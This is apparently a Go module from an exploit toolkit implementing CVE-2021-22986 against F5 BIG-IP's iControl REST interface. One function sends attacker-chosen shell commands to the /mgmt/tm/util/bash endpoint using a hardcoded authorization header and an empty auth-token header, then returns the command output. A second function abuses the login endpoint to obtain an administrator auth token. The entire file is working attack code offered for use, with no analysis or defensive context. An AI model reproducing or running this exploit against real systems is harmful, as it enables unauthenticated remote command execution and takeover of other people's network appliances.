package exp_F5

import (
	"encoding/json"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"regexp"
	"strings"
)

type AutoGenerated struct {
	Kind          string `json:"kind"`
	Command       string `json:"command"`
	UtilCmdArgs   string `json:"utilCmdArgs"`
	CommandResult string `json:"commandResult"`
}

type Exp_CVE_2021_22986 struct {
	exp_templates.ExpTemplate
}

func (self *Exp_CVE_2021_22986) Attack_cmd() (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()
	headers.Add("Authorization", "Basic YWRtaW46QVNhc1M=")
	headers.Add("Content-Type", "application/json")
	headers.Add("X-F5-Auth-Token", "")

	// 构造payload
	payload := `{"command":"run","utilCmdArgs":"-c {#cmd}"}`
	payload = strings.ReplaceAll(payload, "{#cmd}", self.MustGetStringParam("cmd"))
	target := self.Params.BaseParam.Target
	if !strings.Contains(target, "mgmt/tm") {
		target = strings.TrimRight(self.Params.BaseParam.Target, "/") + "/mgmt/tm/util/bash"
	}
	// 发送请求
	httpresp := self.HttpPost(target, payload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if httpresp.Resp.StatusCode == 200 {
		expResult.Result += "解析结果: \r\n"
		cmdResult := &AutoGenerated{}
		err := json.Unmarshal([]byte(httpresp.Body), cmdResult)
		if err != nil {
			expResult.Err = err.Error()
			return
		}
		expResult.Result += strings.ReplaceAll(cmdResult.CommandResult, "\\n", "\r\n")
		expResult.Result += "\r\n\r\n原始结果: \r\n"
		expResult.Result += httpresp.Body
	}
	return
}

func (self *Exp_CVE_2021_22986) Attack_getmsg() (expResult exp_model.ExpResult) {
	// 默认配置
	headers := self.GetInitExpHeaders()
	headers.Add("Content-Type", "application/json")

	// 构造payload
	payload := `{"username":"admin","bigipAuthCookie":"","userReference":{"link":""},"loginReference":{"link":"http://localhost/mgmt/shared/gossip"}}`
	target := self.Params.BaseParam.Target
	if !strings.Contains(target, "mgmt/tm") {
		target = strings.TrimRight(self.Params.BaseParam.Target, "/") + "/mgmt/shared/authn/login"
	}
	// 发送请求
	httpresp := self.HttpPost(target, payload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if httpresp.Resp.StatusCode == 200 {
		expResult.Result += "解析结果: \r\n"
		tmp := regexp.MustCompile(`"token":"(.*?)",`).FindStringSubmatch(httpresp.Body)
		token := "X-F5-Auth-Token: "
		if len(tmp) > 1 {
			token += tmp[1]
		}

		expResult.Result += token

		expResult.Result += "\r\n\r\n原始结果: \r\n"
		expResult.Result += httpresp.Body
	}
	return
}

func init() {

	exp_register.ExpStructRegister(&Exp_CVE_2021_22986{}, "exp_CVE_2021_22986.yml")

}
